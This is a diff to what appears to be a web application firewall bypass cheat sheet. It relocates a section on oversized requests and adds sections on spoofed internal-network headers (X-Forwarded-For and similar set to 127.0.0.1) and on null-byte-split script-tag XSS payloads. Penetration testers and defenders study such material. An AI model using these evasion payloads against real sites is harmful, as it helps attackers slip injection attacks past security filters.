@@ -96,10 +96,8 @@ Depending on the implementation of Unicode normalization, characters that share 
 ```
 
 
-## 5. Content Size
-In some cloud-based WAFs, the request won’t be checked if the payload exceeds a certain size. In these scenarios, it is possible to bypass the firewall by increasing the size of the request body or URL.
 
-
+# Now I will explain more
 
 ## 1. Case Toggling Technique
 Combine upper and lower case characters for creating efficient payloads.
@@ -391,6 +389,35 @@ Content-Type: application/x-www-form-urlencoded; charset=ibm037
 Content-Length: 127
 %89%84%F2=%7D%A4%95%89%97%95%40%81%93%94%40%A2%85%93%85%84%A3%40%5C%40%86%99%97%94%40%A4%A2%85%99%A2%60%60
 ```
+
+
+## 15. Content Size
+In some cloud-based WAFs, the request won’t be checked if the payload exceeds a certain size. In these scenarios, it is possible to bypass the firewall by increasing the size of the request body or URL.
+
+
+
+## 16. Request Header Spoofing:
+* The target is to fool the WAF/server into believing it was from their internal network.
+* Adding some spoofed headers to represent the internal network, does the trick.
+
+```
+X-Originating-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
+```
+
+## 17. Null Bytes:
+* The null bytes are commonly used as string terminator.
+* This can help us evade many web application filters in case they are not filtering out the null bytes.
+
+```
+<scri%00pt>alert(1);</scri%00pt>
+<scri\x00pt>alert(1);</scri%00pt>
+<s%00c%00r%00%00ip%00t>confirm(0);</s%00c%00r%00%00ip%00t>
+```
+
 
 
 ## Tools
